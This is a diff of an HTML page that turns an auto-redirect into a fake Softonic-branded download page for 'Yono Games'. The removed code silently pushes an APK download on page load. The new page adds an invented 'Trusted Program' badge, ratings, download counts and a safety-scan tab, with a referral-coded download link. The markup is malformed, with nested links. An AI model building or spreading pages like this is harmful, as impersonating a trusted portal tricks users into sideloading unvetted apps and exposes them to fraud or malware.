@@ -1,13 +1,443 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Redirecting…</title>
-  <script>
-    window.onload = function() {
-      window.location.href = "https://d1bjlwgcobo9al.cloudfront.net/223/20359548/bossrummy_9HFZF9MSXQ7.apk";
-    };
-  </script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Yono Games - Android App</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#fff;
+    color:#333;
+}
+
+/* TOP BAR */
+.topbar{
+    height:70px;
+    display:flex;
+    align-items:center;
+    padding:0 22px;
+    border-bottom:1px solid #ddd;
+    gap:20px;
+}
+
+.menu{
+    font-size:30px;
+    cursor:pointer;
+}
+
+.logo{
+    font-size:25px;
+    font-weight:600;
+    color:#555;
+    flex:1;
+}
+
+.icons{
+    display:flex;
+    gap:22px;
+    font-size:25px;
+}
+
+/* BREADCRUMB */
+.breadcrumb{
+    padding:25px 25px 10px;
+    color:#777;
+    font-size:15px;
+}
+
+.breadcrumb span{
+    margin:0 6px;
+}
+
+/* APP AREA */
+.app-box{
+    padding:15px 25px;
+}
+
+.app-header{
+    display:flex;
+    gap:20px;
+    align-items:center;
+}
+
+.app-icon{
+    width:115px;
+    height:115px;
+    border-radius:25px;
+    object-fit:cover;
+    box-shadow:0 2px 8px rgba(0,0,0,.2);
+}
+
+.app-info h1{
+    font-size:31px;
+    line-height:1.2;
+    margin-bottom:7px;
+}
+
+.android{
+    color:#777;
+    font-size:17px;
+}
+
+.stats{
+    margin-top:13px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+    flex-wrap:wrap;
+}
+
+.free{
+    color:#00a65a;
+    font-weight:bold;
+}
+
+.star{
+    color:#f7b500;
+    font-size:22px;
+}
+
+.download-count{
+    color:#008c55;
+}
+
+/* BADGE */
+.badge{
+    display:inline-block;
+    margin-top:18px;
+    padding:8px 13px;
+    border:1px solid #ddd;
+    border-radius:18px;
+    font-weight:bold;
+    color:#555;
+}
+
+/* DOWNLOAD */
+.download-btn{
+    display:block;
+    width:100%;
+    margin-top:25px;
+    padding:19px;
+    background:#00a65a;
+    color:white;
+    text-align:center;
+    text-decoration:none;
+    border-radius:13px;
+    font-size:25px;
+    font-weight:bold;
+    box-shadow:0 3px 7px rgba(0,0,0,.15);
+}
+
+.download-btn:hover{
+    background:#008f4d;
+}
+
+/* TABS */
+.tabs{
+    margin-top:45px;
+    border-bottom:1px solid #ddd;
+    display:flex;
+    gap:35px;
+}
+
+.tab{
+    padding:0 5px 17px;
+    font-size:19px;
+    font-weight:bold;
+}
+
+.active{
+    border-bottom:3px solid #222;
+}
+
+/* CONTENT */
+.content{
+    padding:32px 25px;
+}
+
+.content h2{
+    font-size:29px;
+    margin-bottom:22px;
+    line-height:1.25;
+}
+
+.content p{
+    font-size:18px;
+    line-height:1.9;
+    color:#555;
+}
+
+/* RECOMMENDED */
+.recommended{
+    margin-top:45px;
+}
+
+.recommended h2{
+    font-size:24px;
+}
+
+.recommend-card{
+    border:1px solid #ddd;
+    border-radius:14px;
+    padding:12px;
+    display:flex;
+    align-items:center;
+    gap:15px;
+}
+
+.rec-icon{
+    width:62px;
+    height:62px;
+    border-radius:13px;
+    object-fit:cover;
+}
+
+.rec-name{
+    flex:1;
+    font-size:18px;
+    font-weight:bold;
+}
+
+.rec-rating{
+    color:#f5b400;
+    font-size:17px;
+}
+
+.rec-btn{
+    width:55px;
+    height:55px;
+    border-radius:12px;
+    background:#00a65a;
+    color:#fff;
+    border:0;
+    font-size:25px;
+}
+
+/* FOOTER */
+footer{
+    margin-top:40px;
+    padding:30px 25px;
+    background:#f5f5f5;
+    text-align:center;
+    color:#777;
+}
+
+/* MOBILE */
+@media(max-width:600px){
+
+    .topbar{
+        height:65px;
+        padding:0 18px;
+    }
+
+    .logo{
+        font-size:22px;
+    }
+
+    .icons{
+        gap:13px;
+        font-size:22px;
+    }
+
+    .breadcrumb{
+        padding:20px 18px 8px;
+    }
+
+    .app-box{
+        padding:12px 18px;
+    }
+
+    .app-header{
+        gap:16px;
+    }
+
+    .app-icon{
+        width:95px;
+        height:95px;
+        border-radius:21px;
+    }
+
+    .app-info h1{
+        font-size:25px;
+    }
+
+    .android{
+        font-size:15px;
+    }
+
+    .download-btn{
+        font-size:22px;
+        padding:17px;
+    }
+
+    .content{
+        padding:28px 18px;
+    }
+
+    .content h2{
+        font-size:27px;
+    }
+
+    .content p{
+        font-size:17px;
+        line-height:1.8;
+    }
+}
+</style>
 </head>
+
 <body>
+
+<!-- HEADER -->
+<div class="topbar">
+    <div class="menu">☰</div>
+    <div class="logo">softonic</div>
+
+<div class="icons">
+        <span>⌕</span>
+        <span>◉</span>
+        <span>⋮</span>
+    </div>
+</div>
+
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+    🏠 <span>/</span>
+    Android <span>/</span>
+    Games <span>/</span>
+    Yono Games
+</div>
+
+
+<!-- APP -->
+<section class="app-box">
+
+    <div class="app-header">
+
+        <!-- CHANGE APP IMAGE HERE -->
+        <img
+            class="app-icon"
+            src="https://via.placeholder.com/300x300.png?text=YONO"
+            alt="Yono Games">
+
+        <div class="app-info">
+
+            <h1>Yono Games</h1>
+
+            <div class="android">
+                for Android
+            </div>
+
+            <div class="stats">
+                <span class="free">Free</span>
+                <span class="star">★</span>
+                <span>4.3</span>
+                <span>•</span>
+                <span class="download-count">43.6K</span>
+            </div>
+
+            <div class="badge">
+                🛡 Trusted Program
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <!-- DOWNLOAD BUTTON -->
+    <a href="#download"
+       class="download-btn"
+       <a href="https://yonogamesh.com/?code=JJ8AZ82Z&t=1788758908" class="download-btn">
+    ⬇ Free Download
+</a>
+       ⬇ Free Download
+    </a>
+
+
+    <!-- TABS -->
+    <div class="tabs">
+        <div class="tab active">Information</div>
+        <div class="tab">Safety scan</div>
+    </div>
+
+</section>
+
+
+<!-- DESCRIPTION -->
+<section class="content">
+
+    <h2>
+        Convenient Access to Yono Games
+    </h2>
+
+    <p>
+        Yono Games is an Android gaming application designed
+        to provide users with a simple and convenient gaming
+        experience. The clean interface makes navigation easy
+        for both new and returning users.
+    </p>
+
+
+    <div class="recommended">
+
+        <h2>Top Recommended Alternative</h2>
+
+        <div class="recommend-card">
+
+            <img
+                class="rec-icon"
+                src="https://cdn.phototourl.com/free/2026-09-07-b40497cd-82e4-4923-9ecf-c26dda43c832.jpg"
+                alt="Game">
+
+            <div class="rec-name">
+                Casual Games
+            </div>
+
+            <div class="rec-rating">
+                ★ 4.5
+            </div>
+
+            <button class="rec-btn">
+                ↓
+            </button>
+
+        </div>
+
+    </div>
+
+</section>
+
+
+<footer>
+    © 2026 Yono Games — Android Games
+</footer>
+
+
+<script>
+
+function demoDownload(event){
+
+    event.preventDefault();
+
+    alert(
+        "Download link is not configured yet. " +
+        "Add your legitimate app/game URL in the HTML code."
+    );
+
+}
+
+</script>
+
 </body>
 </html>
